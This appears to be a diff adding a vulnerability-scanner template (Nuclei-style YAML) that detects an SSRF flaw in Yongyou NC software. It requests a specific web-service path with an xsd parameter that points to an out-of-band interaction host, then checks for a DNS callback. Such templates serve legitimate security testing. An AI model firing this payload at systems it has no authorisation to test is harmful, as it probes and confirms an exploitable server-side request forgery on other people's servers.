@@ -1,0 +1,19 @@
+id: yongyou-ssrf
+
+info:
+  name: yongyou-ssrf
+  author: str1am
+  severity: high
+  tags: yongyou,ssrf
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/uapws/service/nc.pubitf.rbac.IUserPubServiceWS?xsd=http://{{interactsh-url}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
